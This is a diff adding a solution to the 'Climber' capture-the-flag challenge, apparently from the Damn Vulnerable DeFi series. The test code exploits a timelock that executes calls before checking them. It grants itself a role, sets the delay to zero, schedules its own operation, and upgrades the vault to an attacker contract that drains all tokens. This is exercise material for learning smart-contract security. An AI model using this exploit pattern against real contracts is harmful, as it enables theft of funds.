@@ -2,6 +2,7 @@ const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
+
 describe('[Challenge] Climber', function () {
     let deployer, proposer, sweeper, player;
     let timelock, vault, token;
@@ -58,6 +59,63 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy our HackClimber contract
+        hackClimber = await (await ethers.getContractFactory('HackClimber', player)).deploy(
+            timelock.address,
+            vault.address,
+        );
+        
+        // Create the five interfaces we're going to use
+        const iface = new ethers.utils.Interface([
+            "function grantRole(bytes32 role, address account)",
+            "function updateDelay(uint64 newDelay)",
+            "function scheduleHack()",
+            "function upgradeToAndCall(address newImplementation, bytes memory data)",
+            "function hack(address token, address player)"
+        ]);
+
+        // We're going to encode several function that are going to be called from the ClimberTimelock
+        // We're taking advantage that the ClimberTimelock contract first execute the functions
+        // And only after verify if it's time to execute them
+        // The owner of the ClimberTimelock contract can grant any role to anyone
+        // We're granting the PROPOSER_ROLE to our contract
+        const grantRoleData = iface.encodeFunctionData("grantRole", [
+            "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
+            hackClimber.address,
+        ]);
+        // Next we're going to update the delay from 15 days to 0 seconds
+        const updateDelayData = iface.encodeFunctionData("updateDelay", [0]);
+        // Next we're going to call our contract to schedule the execute action we're executing rightn now
+        // So when the execution of the four functions we're passing as data finished
+        // The operation will be mark as ReadyForExecution
+        const scheduleHackData = iface.encodeFunctionData("scheduleHack");
+        
+        // Finnaly we're going to take advantage that the ClimberVault has not set the Implementation
+        // Because it's an UUPSUpgradeable needs an implementation contract
+        // So we're setting our HackClimber as the implementation contract
+        // Using the upgradeToAndCall function for that
+        // And then calling the hack function from our contract with delegate call
+        // Out function transfer all token from the vault to us
+        const nestedCall = iface.encodeFunctionData("hack", [token.address, player.address]);
+        const setImplementationData = iface.encodeFunctionData("upgradeToAndCall", [
+            hackClimber.address,
+            nestedCall,
+        ]);
+
+        // We're setting the data and the salt into our contract
+        // Otherwise we can encode the data to schedule
+        await hackClimber.setData(
+            [grantRoleData, updateDelayData, scheduleHackData, setImplementationData],
+            ethers.utils.formatBytes32String("salt")
+        );
+
+        // Finnaly we're calling the execute function to finish the hack
+        await timelock.connect(player).execute(
+            [timelock.address, timelock.address, hackClimber.address, vault.address],
+            [0, 0, 0, 0],
+            [grantRoleData, updateDelayData, scheduleHackData, setImplementationData],
+            ethers.utils.formatBytes32String("salt")
+        );
     });
 
     after(async function () {
